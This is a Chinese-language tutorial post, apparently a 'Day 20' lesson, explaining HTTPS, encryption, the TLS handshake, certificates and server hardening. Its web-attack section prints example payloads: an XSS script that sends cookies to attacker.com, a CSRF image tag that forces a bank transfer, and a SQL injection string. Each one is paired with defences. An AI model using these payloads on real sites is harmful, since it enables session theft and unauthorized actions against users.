---
title: 20天：HTTPS和安全
date: 2025-11-10 15:25:35
categories: Network 
tags: Network, Book, Python
---
# 第20天：HTTPS和安全

## 今日目标

- 理解HTTPS的工作原理
- 掌握对称加密和非对称加密
- 学习TLS/SSL协议
- 了解数字证书和CA
- 理解HTTPS握手过程
- 学习常见Web安全攻击和防御
- 实现简单的HTTPS服务器

---

## 1. 为什么需要HTTPS？

### 1.1 HTTP的安全问题

**HTTP是明文传输**：

```
问题场景：

你在咖啡厅使用公共WiFi登录网站
输入用户名：alice
输入密码：mypassword123

HTTP传输：
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json

{"username":"alice","password":"mypassword123"}

危险：
❌ 任何人都可以截获这个数据包
❌ 密码被明文看到
❌ 可以被篡改
❌ 无法验证服务器身份
```

**HTTP的三大安全威胁**：

```
1. 窃听（Eavesdropping）
   - 攻击者截获数据包
   - 读取敏感信息
   - 密码、信用卡号等

2. 篡改（Tampering）
   - 中间人修改数据
   - 注入恶意代码
   - 篡改交易金额

3. 冒充（Impersonation）
   - 伪装成合法服务器
   - 钓鱼攻击
   - 盗取用户信息
```

### 1.2 HTTPS的解决方案

**HTTPS = HTTP + TLS/SSL**：

```
HTTPS的三大保证：

1. 机密性（Confidentiality）
   ✅ 加密传输
   ✅ 无法窃听

2. 完整性（Integrity）
   ✅ 防止篡改
   ✅ 数据验证

3. 身份认证（Authentication）
   ✅ 验证服务器身份
   ✅ 防止冒充

实现方式：
- 对称加密：加密数据
- 非对称加密：交换密钥
- 数字证书：验证身份
- 消息摘要：验证完整性
```

---

## 2. 加密基础

### 2.1 对称加密

**概念**：

```
对称加密 = 加密和解密使用相同的密钥

生活类比：
保险箱：
- 一把钥匙
- 用它锁门
- 用它开门

Alice → Bob：
1. Alice有密钥K
2. Alice用K加密消息
3. Bob用K解密消息
4. 前提：Alice和Bob都知道K
```

**常见算法**：

```
AES（Advanced Encryption Standard）
- 最常用
- 速度快
- 安全性高
- 密钥长度：128/192/256位

DES（Data Encryption Standard）
- 已被淘汰
- 密钥太短（56位）
- 不安全

3DES（Triple DES）
- DES的加强版
- 使用三次DES
- 逐渐被AES取代

ChaCha20
- 移动设备友好
- Google推荐
- 速度快
```

**工作模式**：

```
ECB（Electronic Codebook）
- 最简单
- 不安全（相同明文→相同密文）
- 不推荐

CBC（Cipher Block Chaining）
- 常用
- 每个块依赖前一个块
- 需要初始向量（IV）

GCM（Galois/Counter Mode）
- 推荐
- 认证加密
- TLS 1.3使用
```

**对称加密的问题**：

```
密钥分发问题：

Alice想和Bob通信：
1. Alice生成密钥K
2. 如何安全地把K传给Bob？
   - 网络传输？不安全，会被截获
   - 线下交换？不现实

多人通信问题：
n个人两两通信
需要 n×(n-1)/2 个密钥
100个人 → 4950个密钥 ❌
```

### 2.2 非对称加密

**概念**：

```
非对称加密 = 公钥加密，私钥解密

密钥对：
- 公钥（Public Key）：公开的，任何人都可以用
- 私钥（Private Key）：私密的，只有自己知道

关系：
- 公钥加密 → 私钥解密
- 私钥加密 → 公钥解密

生活类比：
邮箱：
- 邮箱口（公钥）：任何人都能投信
- 邮箱钥匙（私钥）：只有主人能取信
```

**RSA算法**：

```
RSA（Rivest-Shamir-Adleman）

密钥生成：
1. 选择两个大质数 p 和 q
2. 计算 n = p × q
3. 计算 φ(n) = (p-1) × (q-1)
4. 选择 e（公钥指数），通常是 65537
5. 计算 d（私钥指数），满足 e×d ≡ 1 (mod φ(n))

公钥：(n, e)
私钥：(n, d)

加密：c = m^e mod n
解密：m = c^d mod n

密钥长度：
- 1024位（不再安全）
- 2048位（当前推荐）
- 4096位（更安全，但慢）
```

**使用场景**：

```
1. 数字签名
   - 私钥签名
   - 公钥验证
   - 证明身份

2. 密钥交换
   - 用公钥加密对称密钥
   - 私钥解密得到对称密钥
   - 后续使用对称加密通信

3. 数字证书
   - CA用私钥签名证书
   - 浏览器用公钥验证
```

**非对称加密的问题**：

```
速度慢：
- 比对称加密慢100-1000倍
- 不适合加密大量数据

解决方案（混合加密）：
1. 非对称加密：交换对称密钥（只用一次）
2. 对称加密：加密实际数据（快速）
```

### 2.3 哈希函数

**概念**：

```
哈希函数 = 单向函数，不可逆

特点：
- 任意长度输入 → 固定长度输出
- 相同输入 → 相同输出
- 不同输入 → 几乎不可能相同输出
- 无法从输出推导输入（单向）

用途：
- 验证数据完整性
- 密码存储
- 数字签名
```

**常见算法**：

```
MD5（Message Digest 5）
- 128位（16字节）
- 已被破解
- 不再安全
- 只用于非安全场景（文件校验）

SHA-1（Secure Hash Algorithm 1）
- 160位（20字节）
- 已被破解
- Google已弃用

SHA-2家族
- SHA-224、SHA-256、SHA-384、SHA-512
- 推荐使用SHA-256
- 安全

SHA-3
- 最新标准
- 更安全
- 尚未广泛使用

示例：
输入：Hello World
SHA-256：a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e
```

### 2.4 数字签名

**原理**：

```
数字签名 = 证明消息来自特定发送者

步骤：
1. Alice计算消息的哈希值
2. Alice用私钥加密哈希值（签名）
3. Alice发送：消息 + 签名

验证：
1. Bob收到：消息 + 签名
2. Bob用Alice的公钥解密签名，得到哈希值H1
3. Bob计算消息的哈希值H2
4. 比较H1和H2
   - 相同：签名有效
   - 不同：被篡改或伪造

作用：
✅ 身份认证：确认发送者
✅ 完整性：消息未被篡改
✅ 不可否认：发送者无法否认
```

---

## 3. TLS/SSL协议

### 3.1 SSL vs TLS

**历史**：

```
SSL（Secure Sockets Layer）
- 1994: SSL 1.0（未发布）
- 1995: SSL 2.0（有严重漏洞）
- 1996: SSL 3.0

TLS（Transport Layer Security）
- 1999: TLS 1.0（基于SSL 3.0）
- 2006: TLS 1.1
- 2008: TLS 1.2（当前主流）
- 2018: TLS 1.3（最新）

关系：
TLS是SSL的升级版
习惯上仍称为SSL
但实际上都是TLS
```

**版本对比**：

```
┌──────────┬──────────┬──────────┬──────────┐
│  版本    │   状态   │   安全性 │   性能   │
├──────────┼──────────┼──────────┼──────────┤
│ SSL 2.0  │   禁用   │    低    │    差    │
│ SSL 3.0  │   禁用   │    低    │    差    │
│ TLS 1.0  │   弃用   │    中    │    中    │
│ TLS 1.1  │   弃用   │    中    │    中    │
│ TLS 1.2  │  推荐    │    高    │    中    │
│ TLS 1.3  │  最新    │   最高   │    高    │
└──────────┴──────────┴──────────┴──────────┘

推荐：
只使用TLS 1.2和TLS 1.3
禁用所有SSL和旧版TLS
```

### 3.2 TLS协议栈

**分层结构**：

```
┌─────────────────────────────────┐
│        应用层（HTTP等）          │
├─────────────────────────────────┤
│      TLS Handshake Protocol     │  握手协议
├─────────────────────────────────┤
│   TLS Change Cipher Spec        │  切换密码协议
├─────────────────────────────────┤
│      TLS Alert Protocol         │  警报协议
├─────────────────────────────────┤
│      TLS Record Protocol        │  记录协议
├─────────────────────────────────┤
│           TCP                   │
└─────────────────────────────────┘

记录协议（Record Protocol）：
- 分段、压缩、加密、认证
- 传输加密数据

握手协议（Handshake Protocol）：
- 协商加密算法
- 交换密钥
- 验证身份
```

---

## 4. HTTPS握手过程

### 4.1 TLS 1.2 握手（RSA）

**完整流程**：

```
客户端                                  服务器

1. ClientHello
   ───────────────────────────────>
   - 支持的TLS版本
   - 支持的加密套件
   - 随机数（Client Random）

2. ServerHello
   <───────────────────────────────
   - 选择的TLS版本
   - 选择的加密套件
   - 随机数（Server Random）

3. Certificate（证书）
   <───────────────────────────────
   - 服务器的数字证书
   - 包含公钥

4. ServerHelloDone
   <───────────────────────────────

5. 验证证书
   - 检查证书有效性
   - 验证CA签名
   - 检查域名匹配

6. ClientKeyExchange
   ───────────────────────────────>
   - 生成预主密钥（Pre-Master Secret）
   - 用服务器公钥加密
   - 发送给服务器

7. 双方计算
   客户端和服务器都计算：
   主密钥（Master Secret）= PRF(
       Pre-Master Secret,
       Client Random,
       Server Random
   )

8. ChangeCipherSpec
   ───────────────────────────────>
   - 通知：后续使用加密通信

9. Finished（加密）
   ───────────────────────────────>
   - 加密的握手消息摘要

10. ChangeCipherSpec
    <───────────────────────────────

11. Finished（加密）
    <───────────────────────────────

12. 应用数据（加密）
    <══════════════════════════════>

握手完成！
RTT（往返时间）：2-RTT
```

**密钥推导**：

```
材料：
- Client Random（客户端随机数）
- Server Random（服务器随机数）
- Pre-Master Secret（预主密钥，48字节）

计算：
Master Secret = PRF(
    Pre-Master Secret,
    "master secret",
    Client Random + Server Random
)

从Master Secret派生：
- 客户端加密密钥
- 服务器加密密钥
- 客户端MAC密钥
- 服务器MAC密钥
- 客户端IV
- 服务器IV
```

### 4.2 TLS 1.3 握手（优化）

**改进**：

```
TLS 1.3的优化：

1. 1-RTT握手
   - TLS 1.2：2-RTT
   - TLS 1.3：1-RTT
   - 更快！

2. 0-RTT恢复
   - 会话恢复
   - 直接发送数据
   - 最快！

3. 简化密码套件
   - 移除不安全算法
   - 只保留AEAD
   - 更安全！

流程：

客户端                           服务器

1. ClientHello + KeyShare
   ───────────────────────────>
   - 支持的加密套件
   - 密钥交换参数（猜测）
   - 随机数

2. ServerHello + KeyShare
   + Certificate
   + Finished
   <───────────────────────────
   - 选择的加密套件
   - 密钥交换参数
   - 证书
   - 完成

3. Finished
   ───────────────────────────>

4. 应用数据（加密）
   <═══════════════════════════>

握手完成！
RTT：1-RTT（快一倍）
```

---

## 5. 数字证书

### 5.1 什么是数字证书？

**证书 = 服务器的身份证**：

```
数字证书包含：
- 域名（example.com）
- 公钥
- 证书颁发机构（CA）
- 有效期
- CA的数字签名

作用：
证明"这个公钥确实属于example.com"

生活类比：
身份证：
- 照片
- 姓名
- 身份证号
- 公安局盖章

数字证书：
- 公钥
- 域名
- 序列号
- CA签名
```

### 5.2 CA（证书颁发机构）

**信任链**：

```
证书信任链：

根CA（Root CA）
  └─ 中间CA（Intermediate CA）
      └─ 网站证书（End-entity Certificate）

示例：
DigiCert Root CA
  └─ DigiCert SHA2 Secure Server CA
      └─ example.com

验证过程：
1. 浏览器收到example.com证书
2. 验证example.com证书的签名（用中间CA公钥）
3. 验证中间CA证书的签名（用根CA公钥）
4. 检查根CA是否在信任列表中

根CA：
- 预装在操作系统/浏览器中
- 数量有限（约200个）
- 高度可信
```

**著名CA**：

```
商业CA：
- DigiCert
- GlobalSign
- GoDaddy
- Comodo（现在叫Sectigo）

免费CA：
- Let's Encrypt（最流行）
- ZeroSSL
- Cloudflare

自签名证书：
- 自己给自己签名
- 不被信任
- 只用于测试
```

### 5.3 证书类型

```
按验证级别：

1. DV（Domain Validation）
   - 域名验证
   - 最基础
   - 验证：拥有域名控制权
   - 用途：个人网站、博客
   - 价格：免费/便宜

2. OV（Organization Validation）
   - 组织验证
   - 中等
   - 验证：域名 + 组织真实性
   - 用途：企业网站
   - 价格：中等

3. EV（Extended Validation）
   - 扩展验证
   - 最高级
   - 验证：严格的组织审查
   - 显示：绿色地址栏（旧版浏览器）
   - 用途：银行、电商
   - 价格：昂贵

按覆盖范围：

1. 单域名证书
   example.com ✅
   www.example.com ❌

2. 通配符证书
   example.com ✅
   www.example.com ✅
   api.example.com ✅
   *.example.com ✅

3. 多域名证书（SAN）
   example.com ✅
   example.net ✅
   example.org ✅
```

### 5.4 证书格式

```
PEM（Privacy Enhanced Mail）
- 最常用
- Base64编码
- 文本格式
- 扩展名：.pem, .crt, .cer, .key

示例：
-----BEGIN CERTIFICATE-----
MIIDXTCCAkWgAwIBAgIJAKL0UG+mRbSjMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
...
-----END CERTIFICATE-----

DER（Distinguished Encoding Rules）
- 二进制格式
- 扩展名：.der, .cer

PKCS#12 / PFX
- 包含证书和私钥
- 有密码保护
- 扩展名：.p12, .pfx
- 用于导入/导出

证书链文件：
- 包含多个证书
- 从网站证书到根CA
- fullchain.pem
```

---

## 6. 常见Web安全攻击

### 6.1 中间人攻击（MITM）

```
攻击场景：

正常通信：
客户端 ←───────────→ 服务器

中间人攻击：
客户端 ←─→ 攻击者 ←─→ 服务器
         （冒充）

攻击步骤：
1. 客户端请求连接服务器
2. 攻击者截获请求
3. 攻击者连接服务器
4. 攻击者冒充服务器与客户端通信
5. 攻击者窃听/篡改数据

防御：
✅ 使用HTTPS
✅ 验证证书
✅ 证书固定（Certificate Pinning）
✅ HSTS（强制HTTPS）
```

### 6.2 SSL剥离攻击

```
攻击原理：
将HTTPS降级为HTTP

攻击步骤：
1. 用户访问 http://bank.com
2. 服务器重定向 https://bank.com
3. 攻击者截获重定向
4. 攻击者与服务器建立HTTPS连接
5. 攻击者与客户端使用HTTP通信
6. 客户端以为在用HTTPS（其实是HTTP）

防御：
✅ HSTS（强制HTTPS，不允许降级）
✅ 不使用HTTP版本
✅ 浏览器直接输入https://
```

### 6.3 证书欺诈

```
攻击方式：
- 自签名证书
- 伪造证书
- 过期证书

防御：
✅ 浏览器证书验证
✅ 证书透明度（CT）
✅ 公钥固定
✅ 警惕证书警告
```

### 6.4 其他攻击

**XSS（跨站脚本攻击）**：

```
原理：
注入恶意JavaScript代码

示例：
<script>
  // 盗取Cookie
  document.location='http://attacker.com/?c='+document.cookie;
</script>

防御：
✅ 输入验证和过滤
✅ 输出编码
✅ Content-Security-Policy
✅ HttpOnly Cookie
```

**CSRF（跨站请求伪造）**：

```
原理：
利用用户已登录状态，发起恶意请求

攻击：
<img src="http://bank.com/transfer?to=attacker&amount=1000">

防御：
✅ CSRF Token
✅ SameSite Cookie
✅ 验证Referer
✅ 二次确认
```

**SQL注入**：

```
原理：
注入SQL代码

示例：
用户名：' OR '1'='1
SQL：SELECT * FROM users WHERE username='' OR '1'='1'
结果：返回所有用户

防御：
✅ 参数化查询
✅ ORM框架
✅ 输入验证
✅ 最小权限
```

---

## 7. HTTPS最佳实践

### 7.1 服务器配置

```
1. 只使用TLS 1.2和TLS 1.3
   ssl_protocols TLSv1.2 TLSv1.3;

2. 选择强加密套件
   ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:...';
   ssl_prefer_server_ciphers on;

3. 启用HSTS
   Strict-Transport-Security: max-age=31536000; includeSubDomains

4. 启用OCSP Stapling
   ssl_stapling on;
   ssl_stapling_verify on;

5. 配置会话缓存
   ssl_session_cache shared:SSL:10m;
   ssl_session_timeout 10m;

6. 使用证书链
   ssl_certificate /path/to/fullchain.pem;
   ssl_certificate_key /path/to/privkey.pem;
```

### 7.2 安全头部

```
1. Strict-Transport-Security（HSTS）
   Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
   强制使用HTTPS

2. Content-Security-Policy（CSP）
   Content-Security-Policy: default-src 'self'
   防止XSS攻击

3. X-Content-Type-Options
   X-Content-Type-Options: nosniff
   防止MIME类型嗅探

4. X-Frame-Options
   X-Frame-Options: DENY
   防止点击劫持

5. X-XSS-Protection
   X-XSS-Protection: 1; mode=block
   防止XSS攻击

6. Referrer-Policy
   Referrer-Policy: no-referrer-when-downgrade
   控制Referer信息
```

### 7.3 证书管理

```
1. 自动续期
   - 使用Let's Encrypt + Certbot
   - 设置定时任务
   - 避免证书过期

2. 证书监控
   - 监控证书有效期
   - 提前30天告警
   - 自动化流程

3. 多域名管理
   - 使用通配符证书
   - 或SAN证书
   - 统一管理

4. 证书透明度
   - 提交证书到CT日志
   - 监控证书颁发
```

---

## 8. 实战项目：HTTPS服务器

### 8.1 项目需求

```
功能需求：
1. 生成自签名证书
2. 实现HTTPS服务器
3. 实现HTTPS客户端
4. 验证证书
5. 加密通信

技术要求：
- 使用Python ssl模块
- 支持TLS 1.2+
- 证书验证
- 安全配置
```

### 8.2 工具演示

```bash
# 1. 生成自签名证书
python day20_cert_generator.py

# 2. 启动HTTPS服务器
python day20_https_server.py --host 0.0.0.0 --port 8443

# 3. 测试HTTPS客户端
python day20_https_client.py --url https://127.0.0.1:8443/
```

---

## 9. 今日练习

### 练习1：证书分析

```bash
# 查看证书信息
openssl x509 -in cert.pem -text -noout

# 验证证书
openssl verify -CAfile ca.pem cert.pem

# 查看网站证书
openssl s_client -connect www.baidu.com:443 -showcerts
```

### 练习2：抓包分析

```bash
# 使用Wireshark抓包
# 1. 分析TLS握手过程
# 2. 查看证书交换
# 3. 观察加密数据

# 使用tcpdump
sudo tcpdump -i any -w https.pcap port 443
```

### 练习3：配置HTTPS

```python
# 为第19天的HTTP服务器添加HTTPS支持
# 1. 生成证书
# 2. 配置SSL
# 3. 测试HTTPS连接
```

### 练习4：安全测试

```bash
# 使用SSL Labs测试网站安全性
# https://www.ssllabs.com/ssltest/

# 检查项目：
# - 证书有效性
# - 协议支持
# - 加密套件
# - 安全漏洞
```

---

## 10. 常见问题

**Q1：HTTPS会影响性能吗？**

A：
- 有一定影响，但可以接受
- TLS 1.3大幅优化
- 使用HTTP/2可以提升性能
- CDN可以分担负载

**Q2：自签名证书和CA签名证书有什么区别？**

A：
- 自签名：自己签名，不被信任
- CA签名：权威机构签名，被信任
- 自签名只用于测试
- 生产环境必须用CA证书

**Q3：Let's Encrypt是否安全？**

A：
- 完全安全
- 免费但不降低安全性
- 只是自动化了流程
- 被主流浏览器信任

**Q4：HTTPS一定安全吗？**

A：
- 不一定
- HTTPS只保证传输安全
- 服务器本身可能不安全
- 钓鱼网站也可以有HTTPS

**Q5：HTTP/2必须用HTTPS吗？**

A：
- 标准上不强制
- 但所有浏览器都只支持HTTPS版本
- 实际上必须用HTTPS

---

## 11. 总结

今天我们学习了：

### 核心知识点

1. **HTTPS基础**：
   - HTTP + TLS/SSL
   - 解决窃听、篡改、冒充

2. **加密技术**：
   - 对称加密：AES
   - 非对称加密：RSA
   - 哈希函数：SHA-256
   - 数字签名：身份认证

3. **TLS协议**：
   - TLS 1.2：2-RTT握手
   - TLS 1.3：1-RTT握手
   - 协商、认证、加密

4. **数字证书**：
   - 服务器身份证明
   - CA签名
   - 信任链

5. **安全攻击**：
   - MITM：中间人攻击
   - SSL剥离
   - XSS、CSRF、SQL注入

6. **最佳实践**：
   - 只用TLS 1.2+
   - 强加密套件
   - HSTS
   - 安全头部

### 重点回顾

```
HTTPS工作原理：
1. 客户端发起连接（ClientHello）
2. 服务器返回证书（Certificate）
3. 客户端验证证书
4. 密钥交换（KeyExchange）
5. 切换到加密通信
6. 传输加密数据

混合加密：
非对称加密（RSA）→ 交换密钥
对称加密（AES）→ 加密数据

证书验证：
检查有效期 → 验证CA签名 → 检查域名 → 检查吊销状态
```

### 明天预告

**第21天：第三周总结与实战**

内容预览：
- 本周知识回顾
- 综合实战项目
- 性能优化技巧
- 调试和排错
- 工具和资源推荐

---

**继续加油！** 🚀

今天我们学习了HTTPS和Web安全，这是现代互联网的基础。理解HTTPS的工作原理对于开发安全的Web应用至关重要。明天我们将进行第三周的总结，并完成一个综合实战项目！
